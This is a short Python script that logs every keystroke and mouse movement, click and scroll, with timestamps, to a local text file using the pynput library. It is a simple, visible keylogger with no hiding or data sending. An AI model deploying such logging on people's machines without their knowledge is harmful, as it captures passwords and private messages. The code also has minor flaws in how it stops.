# remeber to install pynput (pip install pynput)

from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as mouse_listener
import os
import datetime


def check_log_exist(log_file_name):
    with open(log_file_name, "w") as f:
        f.write("")


def on_press(key):
    write_key_to_log(key)


def on_move(x, y):
    write_mouse_to_log (f"Mouse moved to ({x}, {y})\n")

def on_click(x, y, button, pressed):
    if pressed:
        write_mouse_to_log (f'Mouse clicked at ({x}, {y}) with {button}\n')

def on_scroll(x, y, dx, dy):
    write_mouse_to_log (f'Mouse scrolled at ({x}, {y})({dx}, {dy})\n')


def write_mouse_to_log(msg):
    with open("log.txt", "a") as f:
        current_time = datetime.datetime.now()
        str_time = current_time.strftime("%d/%m/%Y, %H:%M:%S").ljust(40)
        f.write(f"Time pressed: {str_time} {msg}")


def write_key_to_log(key):
    with open("log.txt", "a") as f:
        current_time = datetime.datetime.now()
        str_time = current_time.strftime("%d/%m/%Y, %H:%M:%S").ljust(40)
        f.write(f"Time pressed: {str_time} key: {key}\n")


def on_release(key):
    if key == Key.esc:
        return False


def main():
    path = os.getcwd()
    check_log_exist(f"{path}\log.txt")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        with mouse_listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
            listener.join()


if __name__ == "__main__":
    main()
